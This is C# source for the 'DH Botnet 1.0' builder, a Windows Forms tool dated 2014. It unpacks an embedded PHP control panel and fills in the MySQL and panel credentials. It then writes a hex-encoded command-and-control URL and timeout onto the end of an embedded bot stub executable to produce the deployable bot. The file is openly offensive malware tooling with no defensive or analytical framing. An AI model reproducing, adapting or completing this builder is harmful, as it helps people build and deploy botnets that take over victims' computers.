// DH Botnet 1.0
// (C) Doddy Hackman 2014

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Reflection;

namespace DH_Botnet
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        // Functions

        public string hexencode(string texto)
        {
            string resultado = "";

            byte[] enc = Encoding.Default.GetBytes(texto);
            resultado = BitConverter.ToString(enc);
            resultado = resultado.Replace("-", "");
            return "0x" + resultado;
        }

        public string hexdecode(string texto)
        {

            // Based on : http://snipplr.com/view/36461/string-to-hex----hex-to-string-convert/
            // Thanks to emregulcan

            string valor = texto.Replace("0x", "");
            string retorno = "";

            while (valor.Length > 0)
            {
                retorno = retorno + System.Convert.ToChar(System.Convert.ToUInt32(valor.Substring(0, 2), 16));
                valor = valor.Substring(2, valor.Length - 2);
            }

            return retorno.ToString();

        }

        // http://intellekt.ws/blogs/chris/c-embed-extract-run-resource/

        private void mephobiaButton1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        public void extraer_recurso(string name, string save)
        {

            // Based on : http://www.c-sharpcorner.com/uploadfile/40e97e/saving-an-embedded-file-in-C-Sharp/
            // Thanks to Jean Paul

            try
            {
                Stream bajando_recurso = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
                FileStream yacasi = new FileStream(save, FileMode.CreateNew);
                for (int count = 0; count < bajando_recurso.Length; count++)
                {
                    byte down = Convert.ToByte(bajando_recurso.ReadByte());
                    yacasi.WriteByte(down);
                }
                yacasi.Close();
            }
            catch
            {
                MessageBox.Show("Error unpacking resource");
            }

        }

        private void mephobiaButton2_Click(object sender, EventArgs e)
        {

            string pagina_stub = pagina.Text;
            string timeout_stub = timeout.Text;

            string mysql_host_gen = mysql_host.Text;
            string mysql_user_gen = mysql_user.Text;
            string mysql_password_gen = mysql_password.Text;
            string mysql_data_gen = mysql_database.Text;
            string panel_username_gen = panel_username.Text;
            string panel_password_gen = panel_password.Text;
            string panel_timeout_gen = panel_timeout.Text;

            string check_index_botnet_borrador = AppDomain.CurrentDomain.BaseDirectory + "borrador.php";
            string check_index_botnet_final = AppDomain.CurrentDomain.BaseDirectory + "index_botnet.php";

            string linea_generada = "";

            DH_Tools tools = new DH_Tools();

            if (File.Exists(check_index_botnet_borrador))
            {
                System.IO.File.Delete(check_index_botnet_borrador);
            }

            if (File.Exists(check_index_botnet_final))
            {
                System.IO.File.Delete(check_index_botnet_final);
            }

            extraer_recurso("DH_Botnet.Resources.index.php", "borrador.php");

            string codigo_botnet = tools.openword("borrador.php");

            codigo_botnet = codigo_botnet.Replace("ACA_VA_TU_USER", panel_username_gen);
            codigo_botnet = codigo_botnet.Replace("ACA_VA_TU_PASSWORD_EN_MD5", tools.convertir_md5(panel_password_gen));
            codigo_botnet = codigo_botnet.Replace("ACA_VA_EL_HOST", mysql_host_gen);
            codigo_botnet = codigo_botnet.Replace("ACA_VA_EL_USER", mysql_user_gen);
            codigo_botnet = codigo_botnet.Replace("ACA_VA_EL_PASS", mysql_password_gen);
            codigo_botnet = codigo_botnet.Replace("ACA_VA_EL_NOMBRE", mysql_data_gen);
            codigo_botnet = codigo_botnet.Replace("ACA_VA_EL_TIEMPO_DE_CARGA", panel_timeout_gen);

            tools.savefile("index_botnet.php",codigo_botnet);

            if (File.Exists(check_index_botnet_borrador))
            {
                System.IO.File.Delete(check_index_botnet_borrador);
            }

            extraer_recurso("DH_Botnet.Resources.stub.exe", "stub.exe");

            string check_stub = AppDomain.CurrentDomain.BaseDirectory + "/stub.exe";
            string work_on_stub = AppDomain.CurrentDomain.BaseDirectory + "/done.exe";

            if (File.Exists(check_stub))
            {

                if (File.Exists(work_on_stub))
                {
                    System.IO.File.Delete(work_on_stub);
                }

                System.IO.File.Copy(check_stub, work_on_stub);

                linea_generada = "-pagina-"+pagina_stub+"-pagina-"+"-timeout-"+timeout_stub+"-timeout-";

                string generado = hexencode(linea_generada);
                string linea_final = "-63686175-" + generado + "-63686175-";

                FileStream abriendo = new FileStream(work_on_stub, FileMode.Append);
                BinaryWriter seteando = new BinaryWriter(abriendo);
                seteando.Write(linea_final);
                seteando.Flush();
                seteando.Close();
                abriendo.Close();

                //MessageBox.Show(generado);
                //MessageBox.Show(hexdecode(generado));

                try
                {
                    System.IO.File.Delete(check_stub);
                }
                catch
                {
                    //
                }

                MessageBox.Show("Server Generated");

            }
            else
            {
                MessageBox.Show("Stub not found");
            }
            
            //

        }
    }
}

// The End ?